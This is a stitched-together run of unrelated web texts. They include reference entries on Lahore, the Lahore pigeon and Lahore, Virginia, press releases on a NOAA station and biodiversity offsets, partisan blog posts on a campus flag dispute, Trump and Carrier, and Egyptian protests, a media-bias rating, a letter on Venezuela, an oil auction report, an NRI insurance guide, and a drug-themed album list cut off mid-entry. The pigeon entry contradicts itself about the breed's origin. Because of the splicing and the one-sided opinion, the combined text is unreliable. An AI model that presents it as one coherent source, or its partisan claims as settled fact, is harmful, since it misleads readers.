Lahore (/ləˈhɔər/; Punjabi: لہور ALA-LC: Lahor [ləhoːr]; Urdu: لاہور‎ ALA-LC: Lāhor [lɑːhoːr]) is the capital city of the province of Punjab, the second largest metropolitan area in Pakistan and 16th most populous city in the world. It is an important historical centre in South Asia. With a rich history dating back over a millennium, Lahore is a main cultural centre of the Punjab region and Pakistan and is the largest Punjabi city in the world. One of the most densely populated cities in the world, Lahore remains an economic, political, transportation, entertainment, and educational hub of Pakistan.
Lahore successively served as the regional capital of the empires of the Hindu Shahi kingdom in the 11th century, the Ghaznavids in the 12th century, the Ghurid State in the 12th and 13th centuries and the Mughal Empire in the 16th century. From 1802 to 1849, Lahore served as the capital city of the Sikh Empire. In the mid-19th and early 20th century, Lahore was the capital of the Punjab region under the British Raj. The traditional capital of Punjab for a millennium, Lahore was the cultural centre of the northern Indian subcontinent which extends from the eastern banks of the Indus River to New Delhi. Mughal structures such as the Badshahi Mosque, the Lahore Fort, Shalimar Gardens, the mausolea of Jehangir and Nur Jahan, Chauburji Gate, and the walled city are some of the major tourist attractions in the city. Lahore is also home to many British colonial structures built in the Indo-Saracenic style, such as the Lahore High Court, the General Post Office, Lahore Museum, Lahore Railway Station, and many older universities and colleges including the University of the Punjab, Govt College and King Edward Medical University. The Lahore Zoo, thought to be the fourth oldest in the world, is also situated here.

Lahore pigeon
The Lahore is a breed of fancy pigeon known for its impressive size and gentle nature. Lahores, along with other varieties of domesticated pigeons, are all descendants of the rock pigeon (Columba livia).
Origin
For a very long time this bird was bred in the present area of Lahore, Pakistan. It was imported into Germany around 1880 and became popular among pigeon enthusiasts at the beginning of the 1960s. They are usually found in the area of Iran (Shiraz) and are some of the most colorful pigeons. These ornamental pigeons from ancient Persia were once bred for their meat, but today they are raised for their beautiful plumage and colorful patterns. Their calm and gentle natures also make them delightfully tame pets.
Appearance
The Lahore is large for a pigeon, approximately 10.5 inches tall and 11.5 long. From shoulder to shoulder, it measures 5.5 inches. Its markings are also unusual: the base color is white, with a secondary color beginning at the juncture of beak and wattle and spreading in an arc over the eyes and across the back and wings. The rump and tail are to be white, though in pigeon shows the majority of attention is paid to the quality of the head, neck, and wing markings.

Lahore, Virginia
Lahore /ləˈhɔər/ is a small town in Orange County, Virginia in the United States of America, which was named after the ancient city of Lahore in Punjab, India (now in Pakistan) in the 1850s. The latitude of Lahore is 38.198N. The longitude is -77.969W. It is in the Eastern Standard time zone. The elevation is 364 feet (111 m).
The village was named in the 1800s by the owner of a general store, after reading a book about India.
Purchase of lands
Noor Naghmi, son of Pakistani broadcaster Abul Hasan Naghmi, brought the American Lahore to the news in 2007. The junior Naghmi, is a financial services professional in Vienna, Virginia. After a years long negotiation with farmer Nancy Wallace, who owned 235 acres (0.95 km2) of American Lahore (including the center of the town), Naghmi was able to strike a deal for 3 million dollars.
Noor Naghmi's plan
Naghmi told the Washington Post in 2007 that his 3 million dollar deal will turn Lahore, Virginia into a regional tourist attraction for South Asians and others. His plans include a banquet hall fashioned after his hometown’s famous Shalimar Gardens. He also envisions a library and a museum dedicated to the histories of both Lahores. He wants to open a bed-and-breakfast place to serve chickpea curry alongside eggs and toast. He wants to organize Basant with all its fanfare and pomp in the American Lahore.

Larsen Applauds Funding For Mukilteo Research Station In President’s Budget
Feb 9, 2016 Issues: 114th Congress Accomplishments, ,
WASHINGTON, D.C.—Rep. Rick Larsen, WA-02, today applauded President Obama’s decision to invest in marine science and the economic activity it supports by including $4.6 million in his FY2017 budget to support a new fisheries research station in Mukilteo. The new facility will be part of the Northwest Fisheries Science Center, whose current Mukilteo research station is several decades old and needs major upgrades to continue to produce cutting-edge research. The research station is a facility of the National Oceanic and Atmospheric Administration (NOAA).
“The Pacific Northwest has always been a leader when it comes to protecting our environment. We start a new chapter of environmental stewardship with a cutting-edge research station that will help keep our fisheries vibrant for future generations. From assessing fish stocks and protecting red abalone, which are vital to healthy ocean habitats, to better understanding algae blooms and changing ocean chemistry, the research our scientists are producing is critical to healthy fisheries and the tens of thousands of jobs they support.
“I want to see our region meet the emerging climate change challenges we face, like ocean acidification, with smart and innovative action based on sound science. Ensuring our scientists have access to modern, well-equipped facilities will position us to take on these challenges successfully.
“I applaud the President for recognizing the importance of marine science that fosters a healthy environment and economy in the Pacific Northwest and in other coastal regions nationwide,” Larsen said.
“The research station will be part of a redevelopment of Mukilteo’s entire waterfront, including beach access, trails, mixed use development and a multimodal transportation center. A modernized facility will not only enable significant marine research, but it will serve as an educational hub for students of all ages to learn first-hand about the value of science to our environment and our economy,” said Mukilteo Mayor Jennifer Gregerson. “I thank Congressman Larsen for his efforts to ensure Mukilteo remains a leader on environmental research, and I am so pleased the President has recognized the value of the work that happens here.”
Larsen has long championed efforts to modernize the Center and the research station, whose scientists conduct fisheries research that has both regional and national economic impacts. Larsen also hosted NOAA Administrator Kathryn Sullivan at the Mukilteo research station last year. Funds from the President’s budget would cover the design and environmental work needed to get the site ready for construction.
The Center’s research activities support commercial and recreational fisheries in the Pacific Northwest valued at more than $3 billion and supporting more than 60,000 jobs. The Center’s studies also support a regional shellfish industry worth more than $107 million, the largest in the country.

College Bars Conservative Student Group From Displaying Pro-2A Flag
Posted by Mike LaChance	Sunday, February 17, 2019 at 1:30pm | 2/17/2019 - 1:30pm
“It is completely outrageous that the college would censor our freedom of expression”
Is the school suggesting there is something indecent or offensive about the Constitution?
Townhall reports:
EXCLUSIVE: College Bars Young Americans for Freedom Chapter From Displaying a Pro-2A Flag
Students at Orange Coast College in Costa Mesa, California are having their First Amendment rights trampled on by school administrators. Students from OCC’s Young Americans for Freedom chapter on Wednesday were tabling during a student recruitment fair. The goal was simple: to attract new members to the conservative student organization.
Part of the students’ booth display included a pro-Second Amendment flag that said “Don’t Tread On Me” and “2nd Amendment Since 1789.” But because two silhouettes of rifles appeared on the flag, administrators approached the students during the recruitment fair and demanded it be taken down.
According to the two university officials, the flag violated school policy AP 3530, which prohibits “firearms, knives, explosives or other dangerous objects” and any “facsimile of a firearm.” University officials said the flag fell under the “facsimile of a firearm” aspect of the school policy.
The students, however, disagree with the decision.
“We displayed this flag to express our support for the Second Amendment. It is completely outrageous that the college would censor our freedom of expression to display the image of a firearm. It is very un-American of the administration to prohibit us from displaying our Constitutional right,” said Benjamin Keene, the Chapter Chair of the Orange Coast College Young Americans for Freedom.

I bet the administrators would REALLY get their panties in a wad if the kids were handing out copies of the US Constitution. That subversive document contains all kinds of liberties that the college would like to do away with, like free speech and due process.

The Annie Oakley Society Luncheon and Awards Banquet 11:30 a.m. June 12 National Cowboy & Western Heritage Museum 1700 NE 63rd St. nationalcowboymuseum.org 478-2250 $150 for non-members
The Annie Oakley Societys annual luncheon honors trailblazing women.
Many people are familiar with tales of Annie Oakleys legendary sharpshooting abilities. She toured with Buffalo Bills Wild West show in the late 1800s and achieved great notoriety for her incredible talent and personality. The outspoken young woman even appealed to President William McKinley for lady sharpshooters to help in the Spanish- American War. While she lived, she devoted equal energy to philanthropic causes, especially those dealing with womens rights and education. The diminutive markswoman set records into her 60s. According to her biography, The Life and Legacy of Annie Oakley by Glenda Riley, she earned more than any other performer in Buffalo Bills show besides Bill himself. When she died in 1926, she had spent her fortune on her family and charities that helped women and children and the American Red Cross. The Annie Oakley Society was founded in the spirit of Oakleys indomitable will and pioneering spirit as well as her commitment to womens issues and philanthropic pursuits. The women in the society play an important role in their communities and help recognize those women who, through their lives and works, are shaping tomorrow. The society is particularly devoted to raising money to improve the quality of childrens education at the National Cowboy & Western Heritage Museum. Now in its fourth year, the societys aim is to make sweeping changes to the area of the museum focused on younger visitors. The society holds several networking events throughout the year, but its biggest fundraising event is the annual luncheon and awards. This year, at the annual luncheon, the society will honor two Oklahoma women who personify Oakleys legacy. Kristin Chenoweth is an Emmy and Tony award-winning actress who rocketed to fame playing Glinda the Good Witch in the Broadway production of Wicked. Hailing from Broken Arrow, the diminutive star with a big presence formed a charity partnership with the Broken Arrow Performing Arts Center to bring the world stage to small-town Oklahoma. She will receive the Annie Oakley Society Award. The actress will appear by satellite and will be represented by native Oklahoman and former Miss Oklahoma and Miss America Jane Jayroe Gamble. Pat Summitt will receive the Lifetime Achievement Award. She is a former head coach of the University of Tennessee Lady Volunteer basketball team. Summitt is using her winning attitude and tenacity as she fights a battle with early onset Alzheimers disease. Sherri Coale, head coach of the University of Oklahoma womens basketball team, will represent Summitt at the awards ceremony. The society will also make an announcement about the future of the museum. Seating at the luncheon is free for members, and the event is open to nonmembers. Annual membership in the society is available on a tiered basis starting at $250. Judy Hatfield, Oklahoma chairwoman of The Annie Oakley Society, said Oakley has had an influence on her life. One of my absolute favorite pictures of me as a little girl was me on my mechanical horse  they were called mobos  with my pigtails and my gun being Annie Oakley because I thought she was the coolest person in the world, she said. Hatfield now gets to have a hand in keeping Oakleys legacy for women alive and honoring those with the pioneering spirit embodied in the words Aim high!

CONSPIRACY-PSEUDOSCIENCE
Sources in the Conspiracy-Pseudoscience category may publish unverifiable information that is not always supported by evidence. These sources may be untrustworthy for credible/verifiable information, therefore fact checking and further investigation is recommended on a per article basis when obtaining information from these sources. See all Conspiracy-Pseudoscience sources.
Overall, Sheep Killers is an absolute Tin Foil Hat and Quackery website. Literally, nothing is proven on this website. I say this seriously, Alex Jones would not use them as a source!
Detailed Report
Factual Reporting: LOW
Country: Unknown
History
Founded in 2009, Sheep Killers is an over-the-top conspiracy and pseudoscience website. There isn’t an about page or any names mentioned with the website, but it appears to be a hybrid of biblical literalism and conspiracy theories all mashed together. Their home page reads: “The Bible says that Israel was constantly being led astray by bad leaders. Well, like them, Americans have also have been led astray by bad leadership. Our leaders perfectly fit the description of Israel’s leaders given in Ezekiel chapter 34. The New World Order and our government (if indeed there is a difference) are counting on the fact that most people are really sheep. We are ignorant and easily led – and in many cases we even finance and bring about our own destruction! In an effort to wake people up to the many realities that could easily point to our doom, this website is being designed to expose the Global Elite’s agenda for stripping you of your rights, your money, your property, your privacy and ultimately for the total depopulation of the earth down to a number (500 million) that can easily be controlled to do their bidding. That may sound crazy at first glance. Once, we thought so too. Until our eyes were opened.”
Funded by / Ownership
The blog does not list ownership nor any names associated with the website. We are not sure if or how this page is funded as there is not advertising.
Analysis / Bias
In review, where to start! This website covers every conspiracy and quacked pseudoscience story imaginable. They cover 9-11 as a false flag, Chemtrails as a government means to mind control, the New World Order and of course Obama is a Muslim, that sources the very questionable extreme right WND, which is a fake right wing news source.
In general, this is one of the craziest conspiracy sites on the internet.
Overall, Sheep Killers is an absolute Tin Foil Hat and Quackery website. Literally, nothing is proven on this website. I say this seriously, Alex Jones would not use them as a source! (D. Van Zandt 7/21/2017) Updated (1/2/2019)

Fox News has profiled several Carrier employees and their family members who are crediting President-elect Donald Trump for saving Christmas.
Trump negotiated a deal to keep the air conditioner manufacturer from moving roughly 1,000 jobs to Mexico.
Trump Admin and $UTX reach agreement on keeping close to 1000 factory jobs in Carrier plant in Indiana- sources.

Trending: Ocasio-Cortez Celebrates Gun Confiscation As Real ‘Leadership’
It was a move so bold and ambitious that prominent Democrat Paul Begala couldn’t help but heap praise on Trump.
“I actually applaud him using the bully pulpit to beat up on a powerful corporation to keep jobs in America,” Begala said.
Now the employees from Carrier are applauding him as well, with one worker saying “this made our Christmas so much brighter,” and another whose daughter proclaims, “Daddy, Donald Trump saved your job!”
Via Fox News:
The Bray kids are counting on Santa Claus comin’ to town, and their parents, like more than 1,000 other Carrier employees whose jobs were saved by a dramatic deal negotiated by President-elect Donald Trump, are counting their blessings.
T.J. Bray, 32, whose job at an Indianapolis air conditioner factory was saved after Trump convinced company executives not to move operations to Monterrey, Mexico, is no longer dreading a dismal holiday.
“If you had told me in February this year would end on a good note, I would have told you you’re bat crazy,” the 14-year Carrier production associate told FoxNews.com. “We can all breathe a sigh of relief knowing we can go back to doing what we’ve been doing –doing the best job we can do and going home to take care of our families.”
…
“My daughter now says ‘Daddy, Donald Trump saved your job!’” T.J.Bray said. “Mommy and Daddy don’t have to worry about anything.”
While most in the media have tried to downplay Trump’s successful gambit, one prominent liberal pointed out that President Obama never would have made this deal.
He “wouldn’t have done that,” said Cenk Uygur, host and co-founder of The Young Turks, because “that’s not who he is, he is not that guy.”
He wouldn’t have done it, and he wouldn’t have saved Christmas for these Carrier employees.
But Trump is. And he did.

To the MLWGS’ers who all-too-readily subscribe to leftist thought,
I’m sorry, but this time it’s different. I know the timeline of American history, especially in recent memory, is inextricably linked with overbearing involvement throughout the Americas. I do not think we, as Americans, should ever fail to remember our country’s backing of the bloody Contras in Nicaragua, the barbaric Pinochet in Chile, nor the bestial Perón in Argentina. We are right to never dim the light of history, or we run the risk of impairing judgement with the the blinding, dazzling circumstances of the present. This time though, Reason- cold, calculating, unimpassioned Reason- deems US involvement in South America prudent and necessary. We should help acting President Juan Guaidó oust the dictatorial Nicolás Maduro. This time, things are different.
An attempt to understand the profound depths and dizzying heights of Venezuela’s decay and state of abject failure today demands a return to the 20th century; a return all the way back to the 1920s. Early during the reign of Dictator General Juan Vicente Gomez, oil was discovered in Venezuela. Under Gomez’ steely eyes, annual oil production exploded. By 1929, Venezuela was second only to the United States in total output of oil with 137 million barrels in 1929. Eventually, Gomez died in 1935. His passing marked beginning of the end of Venezuela’s prosperity. By his death, oil had upended all other major domestic products, accounting for 90% of exports. Gomez’ lasting legacy was construction, the black governmental edifice upreared upon the hills and valleys of the South American country, tainted by its reliance on oil.
Now, economists (and even budding civil servants in high school) are duly aware of the malady of Dutch Disease that spurs economic illness and woe across developing countries, but then, the hegemony of Venezuela dictated the economy’s course with an absence of thought and caution. Simply put, those in power in Venezuela were asleep at the wheel. Over time, the Venezuelan Government passed a litany of legislation that contributed to a heightened all-encompassing reliance on oil. The Hydrocarbons Law of 1943 required foreign companies to give half of their oil profits to the state. The Punto Fijo pact of 1958 guaranteed that state jobs and oil profits would be parceled out to the three parties, in proportion to voting results. This dependence on oil might have worked out in Venezuela’s favor had the global oil economy never faltered, but lamentably in the 1980s, global oil prices plummeted. As Perez had nationalized the oil industry in 1976 and continued the country’s downward trajectory by buying a swath of foreign refineries during the recession, Venezuela mired itself in economic debt.
From this state of decay arose the charismatic and polarizing Hugo Chavez. Chavez, a self-declared Bolivarian socialist, won hearts by proclaiming a platform of support. To be fair, Chavez’s increase in government spending admirably cut poverty by 20%. However Chavez also ended term limits, essentially took control of the Supreme Court, closed independent press outlets, and oversaw the doubling of government debt. While the former achievement is impressive, the latter ones are simply cannot be justified in the modern age.
So who are the two Presidents today? Who is Nicolás Maduro and who is Juan Guaidó?
Well, Nicolás Maduro took the reigns of the country over from Chavez in 2013, and promptly was greeted by an economic crisis. In 2014, global oil prices tumbled, the Venezuelan economy went into free-fall, and the fate of socialism in Venezuela was sealed. You cannot overstate how much this collapse should be attributed to Socialist rule. Even though oil sales account for as much as 98 percent of export earnings, and as much as 50 percent of GDP, it is undeniably true that oil production in the country has declined for decades. Since the oil downturn of 2014, it is undeniably true that GDP has shrunk by double digits for three consecutive years, that Venezuela has missed billions of dollars in payments since the country defaulted in 2017, and that inflation now is at more than 80,000 percent, a truly incomprehensible figure. It is also undeniably true that Venezuela now boasts the highest homicide and crime rates in the world, that 3.4 million refugees have left the country since 2014, and that Democratic protests against the Maduro regime have been met with brutal, deadly force.
So now, though some in America may annoyingly complain about “American imperialism”, a simple consultation of these undeniable truths leads to only one path of respectable action. With these undeniable truths in mind, it is clear that the US is utterly justified in its support of acting President Juan Guaidó, the party leader of the most democratically supported party in Venezuela. Juan Guaidó has the right to try to save his country, we have the responsibility of helping him. American aid is needed, and we should rise to the occasion.
The Venezuelan issue is not a partisan one that warrants criticism of President Trump. The Venezuelan issue is not a moral one that warrants criticism of an overbearing Western power exerting its will upon a helpless developing country. The Venezuelan issue is a human issue. Venezuelans lost an average of twenty-four pounds in body weight. Nine out of ten live in poverty.
The despotic Maduro regime is blocking aid from entering the country. Juan Guaidó is a uniting force that is doing what is right. By supporting Guaidó, the United States of America, for once in its dark history of involvement in South America, is on the side of right.
Yours truly,
Oliver Fisk

More than 200 Governments, Business, Bankers, and NGOs Join Call to Action for Biodiversity “Net Gain”
PARIS , France | November 26, 2018
Over 200 individuals from conservation organisations, governments, companies and financial institutions have joined in a “Call to Action” for greater efforts to secure “Biodiversity Net Gain” in the context of development. The call to action was issued during Natural Capital Week, where the Business and Biodiversity Offsets Programme (BBOP) launched a new set of roadmaps and guidance for business and government to craft economic development strategies that result in an overall gain of biodiversity, rather than loss.
“Governments and businesses face a true dilemma: How to support development, so people have access to food, materials, energy, infrastructure and jobs, while conserving biodiversity?” explained Kerry ten Kate, the Director of BBOP. “Everyone is looking for practical approaches. The BBOP tools and resources provide the know-how, but many of our colleagues have issued the urgent ‘Call to Action’ to urge developers and decision-makers to act.”
Biodiversity has never been in greater peril. WWF’s 2018 Living Planet Report, for which ZSL (Zoological Society of London) provides Living Planet Index data, released in October, shows an overall decline of 60% in species’ populations between 1970 and 2014, a trajectory that will likely be exacerbated by global warming. A major driver of this decline is loss of habitat, linked to large-scale infrastructure projects, such as new roads, dams, and mines, and commercial agricultural expansion.
“Companies and financial institutions are getting more and more interested in measuring their impacts and dependencies on biodiversity,” says Joshua Berger of CDC Biodiversité, a subsidiary of Caisse des Dépôts et Consignations Group. “Mapping the impacts throughout the value chain and investments will soon become a priority. The work the BBOP has done to clarify concepts and provide tools and roadmaps toward a net gain future is very helpful,” adds Marc Abadie, President of CDC Biodiversité.
“There are already encouraging results in improving the mitigation of development impacts on biodiversity,” says Ray Victurine of WCS. “In 2014, 39 countries had existing laws or policies requiring that ‘No Net Loss’ or even a ‘Net Gain’ of biodiversity occur through the economic development process. Today, over 100 countries require or enable similar measures.” He also points out that 94 financial institutions that are members of the Equator Principles Association have already set ‘safeguard’ conditions for project finance that require no net loss of natural habitat and a net gain in critical habitat. And more than major 60 companies have also made public, company-wide commitments or have stated aspirations related to no net loss or net gain of biodiversity resulting from their business activities. “Now is the time to move forward to put these policies and commitments into practice if we are to stem the tide of biodiversity loss,” says Victurine.
Signatories are calling for the following actions to ensure that net gain of biodiversity is embedded in economic development planning and financing:
· GOVERNMENTS should produce clear, well-governed national mitigation regulations, timely land-use planning and give licenses only to companies demonstrating best practice.
· COMPANIES should include biodiversity early enough in planning projects to be able avoid and minimise impacts, commit to achieve a net gain of biodiversity and communicate their progress transparently.
· FINANCIAL INSTITUTIONS should enforce net gain safeguards policies and performance standards and encourage companies they’re invested into to apply best practice.
· MULTILATERAL BANKS and other donors should provide financing to governments to establish mitigation systems to achieve net gain.
· CONSERVATION ORGANISATIONS AND ACADEMIA should help gather biodiversity information and establish the scientific targets and measures needed to underpin net gain, and support and independent evaluation to companies and governments.
· MEMBERS OF CIVIL SOCIETY should hold governments, companies and financial institutions to account, expecting high standards and transparency about the potential and actual achievements of the promises made.
“There’s now great clarity on what’s needed to make the leap to Biodiversity Net Gain,” says ten Kate. “It is captured in just one page in the Call to Action. Everyone needs to play their part in putting it into practice.”
ABOUT THE BUSINESS AND BIODIVERSITY OFFSETS PROGRAMME
BBOP is an international collaboration involving over 100 government agencies, companies, financial institutions, NGOs and individual experts. Over 2300 people from 45 countries have been involved in BBOP’s ‘Community of Practice’ over the last 15 years. Together, the members have developed and tested best practice on how to plan development (from national policy down to individual projects, such as a new road or mine) to achieve “No Net Loss” and preferably a “Net Gain” in biodiversity. This includes an internationally recognized Standard – on ‘avoid, minimize, restore, offset’ to try and achieve ‘Biodiversity Net Gain’ and ‘roadmaps’ for government and business. BBOP has been the principal global forum for collective learning in this area.

Brazil’s Pre-Salt Auction To Proceed Despite Injunction
By Tsvetana Paraskova - Oct 27, 2017, 10:30 AM CDT
The government of Brazil is confident that the auction for its promising pre-salt oil layer will proceed as planned today, after it had appealed an injunction ordering the suspension of the auction issued late on Thursday, Brazilian Mining and Energy minister Fernando Coelho Filho told Reuters.
On Thursday, the leftist Workers Party sought an injunction, and a federal judge in the Amazonas state issued an injunction ordering the suspension of the today’s auction. The Workers Party is against foreign firms operating oil blocks and against reduced powers and roles of state-controlled Petrobras in Brazil’s oil industry.
However, the injunction could easily be overturned, and the government has appealed it.
“We believe the suspension will not remain in place. We will see a great auction,” Coelho Filho told Reuters.
The two oil auctions, the second and third rounds of pre-salt layer auctions, will begin at 9 a.m. local time, oil regulator ANP said in a tweet early on Friday.
If the injunction is overturned, Brazil will hold today the second and third rounds of auctions for blocks in its pre-salt layer, considered one of the most promising potential developments offshore Brazil.
Last week, ANP said that it might reopen bidding for the oil blocks in the pre-salt layer that don’t receive bids.
Earlier this month, the Brazilian regulator published the list of the companies admitted to bidding in the two rounds. Ten firms were approved to bid in the second round and 14 were cleared to bid in the third round. Bidders include all the oil industry’s heavyweights, including Exxon, Petrobras, Petronas, Repsol, Shell, Statoil, Total, Chevron, BP, CNODC, CNOOC, and Ecopetrol. Each of the two rounds will offer up four blocks for auction.

The bidding rounds in the pre-salt layer will offer areas for oil and natural gas exploration and production under production sharing agreements. Brazil expects the eight blocks on offer to generate a total of US$36 billion in investments. The development of the blocks is also expected to generate a combined US$130 billion in royalties, profits, and income tax for the Brazilian state.
Earlier this week, Wael Sawan, Executive Vice President Deepwater at Shell, said that the supermajor would be bidding in the auction and was confident that it can produce oil from Brazil’s pre-salt layer for less than $40 per barrel.

EGYPT: THE DEMONSTRATORS, THE GOVERNMENT; DIFFERENT GOALS—FOR NOW
Posted on August 27, 2011	by Richard Johnson
The demonstrators after Friday’s “prayers” (There may have been more police than demonstrators.)
CAIRO: Over a thousand protesters gathered in front of the Israeli embassy following Friday prayers in what was dubbed the “Friday of Expelling the Ambassador”, reiterating their demands to cut diplomatic ties with Israel, after the shooting of five Egyptian soldiers on the borders on Aug. 19.
“We don’t want a single Israeli on our land anymore,” Sa’deya Mohamed, 70, told Daily News Egypt.
And, “The people want the right of our martyrs in Sinai be regained,” protesters, holding the Egyptian flags, chanted outside the embassy amid tight security. Others shouted: “The people’s first demand is to have the ambassador evicted.”
One of the protesters shot in the air and managed to leave the scene before police could arrest him, according to witnesses.
A 23-year-old Egyptian, Ahmed Shahhat, climbed to the roof of the 13-story apartment building housing the embassy early Sunday morning and removed the Israeli flag from the roof, replacing it with an Egyptian flag he had carried with him.
Shahhat, who became an instant folk hero in Egypt, said his action had come in protest against the killing of the three Egyptian soldiers. A resident in the building opened his balcony door for Shahhat, who made the rest of the way down by elevator and was welcomed by thousands of protesters who have been demonstrating outside the building with calls to suspend the Israel-Egypt peace treaty.
The Government is on a different course, sending more troops into Sinai
Because, surprise, surprise, one immediate result of the “Arab Spring” is a brand new branches of al-Q’aida and other terrorist groups now operating in Egypt’s Sinai desert. One group is al-Qa’ida in the Sinai Peninsula. Another group calls itself al-Shabab al-Islam (Youth of Islam).
This, together with last week’s attack in which eight Israelis were killed by Palestinian militants who infiltrated the border, moved Israel to agree to significant additional Egyptian troop deployment. (Earlier this year, before the fall of Egyptian president Hosni Mubarak, Israel permitted Egypt to send thousands of extra soldiers to northern Sinai to combat Islamic gunmen operating there.)
What could go wrong with that? Expect the Egyptian government, after elections, to be far more in line with the demonstrators at the Israeli embassy than with Israel.

NRIs Buying Life Insurance in India: 5 Points to Ponder
September 10, 2018 September 10, 2018 Danish Sadiq	
You are an NRI with strong roots in India then you should consider buying insurance in India. Needless to say, India’s economy is booming and any investment on Indian soil will further boost your finances. Insurance companies now offer customized plans to meet the requirements of NRIs.
Here is a list of 5 things that you need to consider buying taking the plunge into buying insurance in India.
1. Check Your Eligibility
NRIs and PIO are allowed to buy life insurance in India, subject to fulfillment of certain conditions. NRI refers to an Indian national resident abroad for certain duration, and PIO is a citizen of any country other than Bangladesh or Pakistan, if:
1) the individual has held Indian passport, any time in the past
2) the person or either parents or grand-parents were a citizen of India by virtue of the Constitution of India or the Citizenship Act, 1955
3) the individual is a spouse of an Indian citizen or a person referred to in clauses 1 or 2.
If you are an NRI and want to purchase life insurance in India, you should have a valid passport issued by government of India. And for PIO, if you come under any of the above-mentioned categories then surely you can buy life insurance plan in India.
2. Choose Your Insurance Company
As now you are eligible, the next step is to find a reliable insurer. There are over 23 life insurance companies offering a wide range of products to choose from. Consider factors such as the pedigree of the management, company’s claim settlement ratio, track record, and parent group’s experience. There are no specific policies offered by insurance companies for non-residents, but a few insurers have actually restructured their processes of issuing insurance policies to NRIs. They will help you with documentations and other requirements for medical tests, etc. Here’s the list of some of the companies who have managed to streamline their NRI centers:
SBI Life Insurance
Life Insurance Corporation of India (LIC)
Max Life Insurance
ICICI Prudential Life Insurance
Kotak Life Insurance
3. Gather Information About Taxation
Before buying a policy, you are advised to take into consideration tax laws in force both in India and in the location where you are residing. Check for tax implications at all three stages of policy life cycle – investment, accumulation, and maturity. While current tax laws in India exempt all three stages from tax, make sure it is same in your country. Consult a specialist who can make you understand the tax related queries before buying life insurance in India.
Insurance policies taken in India can be both affordable and comprehensive. Do evaluate your options vigilantly before selecting a life insurance plan to invest in!
4. Identify Your Mode of Premium Payment
Check the premium payment methods of the policy in advance so that you don’t have to face any trouble later. There are two ways of premium payment; one is foreign currency-denominated policies in which you pay the premiums in foreign currency or through your NRE/FCNR account, and second is rupee denominated policies in which you pay premiums in rupees using NRO accounts.
Here’s the table showing comparison between NRE, NRO and FCNR accounts

The 50 Most Drug-Addled Albums in Music History
Sean Beaudoin
Wednesday, February 26, 2014	
RAMPANT MADNESS, cheap powder, and the whiskey river: below are the 50 most debauched, sodden, and certifiable records in music history.
The rules are simple: being merely eccentric while swathed in outlandish clothing fails to qualify. Having done an epic amount of street powder while getting handjobs in the groupie van is not enough. Hell, Steven Tyler claims to have spent $3 million on cocaine over the years, but would Aerosmith have sounded one iota different if they’d been straight edge? It’s the same reason Mötley Crüe doesn’t warrant space on this list. Sure, they snorted live ants (actually, that was Ozzy) and mainlined Jack Daniel’s to stave off epic boredom, but their music would have been exactly the same steaming pile of hair regardless.
No, to make this list, the music on a given album has to bleed chemical influence while also leaching a very specific brand of desperation and/or madness. The vocals, the rhythm, the melody–all have to be drenched in reverb, compression, and frighteningly altered states that could not have been recorded any other way. Except through a blind leap into the void.
And sometimes madness itself is that chemical.
Roll it, pour it, cook it, crush it, or just get stone-cold crazy; the needle will drop into the groove either way.
But excess is never enough. There also has to be undeniable beauty. And there is. Every single album on this list is a remarkable document, and warrants repeated listens over the course of a lifetime.
Also, no reggae allowed.
50. Skip Spence – Oar
The place where this list had to start, essentially the Rosetta Stone for drug-induced madness, this is an archive of excess. Spence was a founding member of both Jefferson Airplane and Moby Grape, who spent months howling at the walls in Bellevue after epic runs of windowpane LSD. Just after his release he was cynically recorded, releasing Oar, which is a mix of shambling nonsense and haunting ballads, soul-baring and childish in turns. The despair is palpable. This album has been passed around for years among giggling heads, serious collectors, and those in recovery looking for inspiration or something to truly fear. Everyone had a piece of Spence but Spence, who spent the rest of his life in one institution or another.
49. Spacemen 3 – Taking Drugs to Make Music to Take Drugs To
You’d have to figure when it’s spelled out so blatantly they’re probably pure-veined Mormons pulling off an elaborate inside joke. Nope. This fuzzed-out squeamish throb of an album begs for either Jesus or rehab in every other line, each of which is held uncomfortably long, the vocal equivalent of a mescaline freak staring at the wrinkles on their palm: have you ever noticed how your hand looks like a highway overpass? So what if the other songs often sound embarrassingly like all of the Velvet Underground compressed into one scorched spoon? What matters is that each track smells like a week crashed in a Manchester apartment trying (and failing) to have sex with Jesus and Mary Chain groupies on a velour couch covered in cigarette burns and drool.
48. David Bowie – Heroes
Station to Station would be the obvious choice from the Bowie discography, if only because even amongst his other slabs of space oddity and forced outrageousness, Station is notoriously hunkered in a blizzard of cocaine of the quality usually reserved for Bolivian generals and DuPont heiresses. It’s a landscape of head-shaved, locked-door madness in which a thin white duke might spend six months grinding his jaw, whispering epic gibberish into a cheap microphone. Each song sounds gargled and twitchy, run through a filter of back-of-the-throat gak. And yet the choice here is Heroes, if only because it was recorded in Berlin, where Bowie and Iggy went to clean up, trading powder for midgets and sex clubs and random Prussian decadence. There the high was a tantalizing memory, and the resultant album even more amazing for its utterly bloodless inflections. Heroes is a nut-cutting, blue ice, deep Arctic void of an album. As well as totally brilliant.
47. Eddie Cochran – C’mon Everybody
Is there any more powerful drug than unfocused teenage sexuality? Either through orgasm or chemical rush, Cochran’s raspy bass voice and “fuck ’em all” lyrics lit an intoxicating pyre under the first 50’s wave of rockabilly crossovers, which were absolutely dripping with the primal frustration and random anger unmatched by later, more overtly sexual acts. Cochran’s filthy twang, which ruled the radio waves when panties were still pure, can be heard in nearly every rock band since, from Led Zeppelin to the White Stripes, decades of ready bobby-soxers mainlining shuffle rhythm to get their rocks off. Cochran died in a car crash at age 21.
46. The Replacements – All Shook Down
Widely hated by most Replacements fanatics, All Shook Down is a grim slog through the wreckage of the band that is austere and revealing in turns. It’s pre-rehab but post-realization, a dissipated reprieve where stock must be taken and hard decisions made. Paul Westerberg sounds nearly bereft, the money spent, the bottles broken, the giddy buzz ten years gone. The rest of the band is surly and indifferent in turns. Founding guitarist Bob Stinson had already been “fired” for his erratic behavior and clumsy leads, left to deal (and die) with his addiction and mental illness alone—and the resultant karma is palpable. That said, the album is a slab of unwitting truth that has been more or less ignored since its release.
45. JJ Cale – Naturally
This album, released in 1971, is mostly known for the song “After Midnight,” which would be butchered a few years later by Eric Clapton–a fact Cale was completely unaware of until he heard his own song on the radio, transformed into a 70’s radio staple and moneymaking pow(d)erhouse. Whether Cale continued to abuse white lines, or just sound like he did, this album is like a sunny afternoon in a hammock with a beautiful girl, a joint, and decades of easy living ahead. Cale’s signature laid back virtuosity is in evidence track-by-track. There’s a reason Neil Young called Cale and Jimi Hendrix the “best electric guitar players I ever heard.” And that reason is because Cale managed to make every single song he ever recorded sound like 2am in downtown Tulsa, standing outside a bar that serves free hot dogs.
44. Nick Drake – Pink Moon
